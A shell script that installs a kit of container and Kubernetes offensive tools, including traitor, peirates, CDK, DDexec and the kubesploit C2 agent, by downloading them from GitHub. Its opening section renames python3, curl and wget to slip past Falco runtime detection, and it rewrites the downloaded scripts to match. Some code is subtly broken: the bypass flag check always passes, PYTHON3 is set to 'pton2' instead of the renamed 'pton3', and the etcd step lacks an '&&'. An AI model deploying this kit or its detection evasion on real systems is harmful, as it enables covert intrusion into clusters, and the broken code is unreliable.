#Simple Bypass Falco
BYPASS_FALCO=0 #true
WGET="wget"
CURL="curl"
PYTHON3="python3"

if [ $BYPASS_FALCO ]; then
    mv /usr/bin/python3 /usr/bin/pton3 \
        && mv /usr/bin/curl /usr/bin/kurl \
        && mv /usr/bin/wget /usr/bin/vget;

    WGET="vget"
    CURL="kurl"
    PYTHON3="pton2"
fi

# Install botb
$CURL -s https://api.github.com/repos/brompwnie/botb/releases/latest | grep "browser_download_url.*linux-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install botb-linux-amd64 /usr/local/bin/botb \
    && rm -rf botb-linux-amd64;

# Install traitor
$CURL -s  https://api.github.com/repos/liamg/traitor/releases/latest | grep "browser_download_url.*-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install traitor-amd64 /usr/local/bin/traitor \
    && rm -rf traitor-amd64;

# Install kubeletctl
$CURL -s  https://api.github.com/repos/cyberark/kubeletctl/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install kubeletctl_linux_amd64 /usr/local/bin/kubeletctl \
    && rm -rf kubeletctl_linux_amd64*;

# Install kubesploit C2 agent
$CURL -s  https://api.github.com/repos/cyberark/kubesploit/releases/latest | grep "browser_download_url.*-Linux-x64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && 7z x kubesploitAgent-Linux-x64.7z -r kubesploitAgent-Linux-x64 -pkubesploit \
    && install kubesploitAgent-Linux-x64 /usr/local/bin/kubesploit \
    && rm -rf kubesploit*;

# Install CDK
$CURL -s  https://api.github.com/repos/cdk-team/CDK/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install cdk_linux_amd64 /usr/local/bin/cdk \
    && rm -rf cdk_linux_amd64*;

# Install peirates
$CURL -s  https://api.github.com/repos/inguardians/peirates/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && tar -xJf peirates-linux-amd64.tar.xz \
    && install peirates-linux-amd64/peirates /usr/local/bin/ \
    && rm -rf peirates-linux-amd64*;

# Install ctrsploit
$CURL -s  https://api.github.com/repos/ctrsploit/ctrsploit/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install ctrsploit_linux_amd64 /usr/local/bin/ctrsploit \
    && rm -rf ctrsploit_linux_amd64*;

# Install kdigger
$CURL -s  https://api.github.com/repos/quarkslab/kdigger/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install kdigger-linux-amd64 /usr/local/bin/kdigger \
    && rm -rf kdigger-linux-amd64*;

# Install kubectl
$CURL -LO https://storage.googleapis.com/kubernetes-release/release/`$CURL -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl \
    && mv kubectl k \
    && install ./k /usr/local/bin/ \
    && rm ./k;

#Install amicontained
$CURL -s  https://api.github.com/repos/genuinetools/amicontained/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install amicontained-linux-amd64 /usr/local/bin/amicontained \
    && rm -rf ./amicontained-linux-amd64;

#Install linuxprivchecker
$CURL -LO https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py \
    && install ./linuxprivchecker.py /usr/local/bin \
    && rm -rf linuxprivchecker.py;

#Install unix-privesc-checker
$CURL -L http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz \
    | tar -xz \
    && install unix-privesc-check*/unix-privesc-check /usr/local/bin/ \
    && rm -rf unix-privesc-check*;

#Install deepce
$CURL https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh > deepce.sh \
    && sed -i "s/wget/$WGET/g" deepce.sh \
    && sed -i "s/curl/$CURL/g" deepce.sh \
    && sed -i "s/python3/$PYTHON3/g" deepce.sh \
    && chmod +x deepce.sh \
    && install ./deepce.sh /usr/local/bin \
    && rm -rf deepce.sh;

#Install helm
$CURL https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 > get_helm.sh \
    && sed -i "s/wget/$WGET/g" get_helm.sh \
    && sed -i "s/curl/$CURL/g" get_helm.sh \
    && chmod 700 get_helm.sh \
    && ./get_helm.sh \
    && rm ./get_helm.sh;

#Install kube-hunter
$CURL -s  https://api.github.com/repos/aquasecurity/kube-hunter/releases/latest | grep "browser_download_url.*-linux-x86" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - -O kube-hunter \
    && install kube-hunter /usr/local/bin/kube-hunter \
    && rm ./kube-hunter;

#Install kubescape
$CURL -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh > kubescape_install.sh \
    && sed -i "s/curl/$CURL/g" kubescape_install.sh \
    && chmod 700 kubescape_install.sh \
    && ./kubescape_install.sh \
    && rm ./kubescape_install.sh;

#Install kube-bench
$CURL -s  https://api.github.com/repos/aquasecurity/kube-bench/releases/latest | grep "browser_download_url.*_linux_amd64.deb" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - -O kube-bench.deb \
    && dpkg -i kube-bench.deb \
    && rm -f kube-bench.deb;

#Install etcdctl
$CURL -s  https://api.github.com/repos/etcd-io/etcd/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - -O etcd.tar.gz \
    mkdir -p etcd-latest && tar -xzvf etcd.tar.gz -C etcd-latest --strip-components=1 \
    && cp etcd-latest/etcdctl /usr/local/bin \
    && chmod +x /usr/local/bin/etcdctl \
    && rm -rf etcd*;

#Install DDexec
$CURL -LO https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh \
    && chmod +x ddexec.sh \
    && install ddexec.sh /usr/local/bin/ddexec.sh \
    && rm ./ddexec.sh;

# Install kubetcd
$CURL -s  https://api.github.com/repos/nccgroup/kubetcd/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | $WGET -qi - \
    && install kubetcd_linux_amd64 /usr/local/bin/kubetcd \
    && rm ./kubetcd_linux_amd64;